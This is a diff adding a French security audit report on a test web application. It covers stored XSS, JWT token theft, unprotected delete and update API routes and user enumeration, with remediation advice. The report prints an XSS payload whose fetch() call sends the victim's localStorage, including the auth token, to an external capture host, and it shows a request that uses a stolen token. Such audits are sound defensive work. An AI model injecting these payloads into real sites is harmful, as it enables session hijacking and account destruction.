@@ -79,6 +79,151 @@ Limiter les sources de scripts autorisées pour empêcher l’exécution de scri
 ### 5.4 Validation côté client (optionnelle mais recommandée)
 Améliorer l’expérience utilisateur en détectant les erreurs avant l’envoi.
 
-## 6. ✅ Conclusion
+## 6. ✅ Conclusion
 La faille XSS détectée est critique et doit être corrigée rapidement pour protéger les utilisateurs et préserver l’intégrité du site. L’implémentation d’un filtrage rigoureux, couplée à une politique CSP, est indispensable.
+
+
+
+# 🔒 Rapport d’Audit Cybersécurité — Vulnérabilités XSS & API
+
+## 👥 Équipe : LaDébauche
+
+## 📅 Date : 06/12/2025
+
+## 🌐 Cible : http://10.33.70.223:8000/
+
+## 1. 📋 Contexte
+Dans le cadre de notre audit de sécurité, nous avons analysé le site à travers les différents points d'entrée utilisateur. Nos investigations se sont concentrées sur :
+
+🗨️ les champs de commentaires
+
+🔁 les requêtes et endpoints de l’API
+
+🔐 la gestion de l’authentification et des tokens
+
+## 2. ⚠️ Vulnérabilités identifiées
+### 2.1 💥 Vulnérabilité XSS (Cross-Site Scripting)
+📍 Localisation : champ commentaire des stations
+🧪 Payload testé :
+```bash
+<script>alert(1)</script>
+```
+et
+```bash
+<script>
+fetch("http://d0ypw08z1wg0000e4rzggoxmqyryyyyyb.oast.pro/capture?ls=" + JSON.stringify(localStorage))
+</script>
+```
+
+## 📦 Données exfiltrées :
+```bash
+{
+  "auth_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+  "auth_user": "{\"id\":\"683d6f78...\",\"email\":\"oui@oui.com\",\"name\":\"Oui\"}"
+}
+```
+
+## 🎯 Impact :
+Vol du localStorage, y compris du token JWT ⚠️
+
+Prise de contrôle de session utilisateur
+
+Injection de scripts malveillants pour d'autres utilisateurs
+
+## ✅ Recommandations :
+Échapper les caractères spéciaux via regex :
+Exemple : ```r'[<>{}()"\'/;]'```
+
+Utiliser des librairies de sanitisation côté back-end (DOMPurify, bleach, etc.)
+
+Appliquer une Content-Security-Policy restrictive
+
+### 2.2 🔓 Exploitation de l’API : token manipulable
+📍 Détail : Le token JWT peut être récupéré via XSS ou intercepté via session non sécurisée (pas de HttpOnly). Ensuite, il est possible de :
+
+🧼 Supprimer le compte utilisateur en appelant une route /api/delete avec le token
+
+🛠️ Modifier les données du profil via /api/update
+
+📥 Exemple de requête malveillante :
+
+```bash
+DELETE /api/delete_account
+Authorization: Bearer <token_volé>
+```
+
+🎯 Impact :
+Suppression de comptes utilisateurs
+
+Modification de données sensibles
+
+Usurpation d'identité numérique
+
+✅ Recommandations :
+Ajouter l’attribut HttpOnly et Secure au cookie du token
+
+Implémenter une vérification côté serveur :
+
+IP ou user-agent liés au token
+
+double vérification avant suppression
+
+Ajouter une confirmation (mot de passe ou 2FA) avant suppression
+
+### 2.3 🧠 Enumeration des utilisateurs
+📍 Détail : Le champ auth_user renvoyé contient l’email et nom de l’utilisateur connecté. Cela permet :
+
+de deviner des noms d’utilisateurs valides
+
+de lancer des attaques de brute force sur /login
+
+📥 Exemple de réponse serveur :
+
+```bash
+{
+  "auth_user": "{\"id\":\"683d6f...\",\"email\":\"oui@oui.com\",\"name\":\"Oui\"}"
+}
+```
+🎯 Impact :
+Deviner les comptes existants
+
+Tentatives massives de bruteforce sur les identifiants
+
+Risque de compromission de comptes faibles
+
+✅ Recommandations :
+Ne pas exposer les noms/emails via le client sans nécessité
+
+Implémenter une stratégie anti-bruteforce :
+
+limitation du nombre de tentatives (rate limiting)
+
+délai progressif
+
+CAPTCHA
+
+Sur /login, renvoyer un message neutre :
+
+❌ "Identifiants incorrects" (au lieu de préciser si l’email existe)
+
+## 3. 🛠️ Synthèse des Recommandations
+🛑 Vulnérabilité	✅ Remédiation principale
+XSS	Échapper/sanitiser le HTML + CSP
+Token exposé via XSS	HttpOnly, validation serveur, token lié à l'IP
+Suppression API sans protection	Confirmation d’action (mot de passe ou 2FA)
+Enumeration utilisateur	Masquer infos, ajout CAPTCHA & rate limiting
+
+## 4. ✅ Conclusion
+L’audit a permis de mettre en évidence plusieurs vulnérabilités critiques :
+
+Une faille XSS exploitable à distance
+
+Une exposition du token d’authentification
+
+Un défaut de contrôle sur les endpoints API sensibles
+
+Une possibilité d’énumération d’utilisateurs et d'attaque par bruteforce
+
+➡️ Une correction rapide est fortement recommandée pour éviter un détournement de comptes ou une perte de données utilisateurs.
+
 
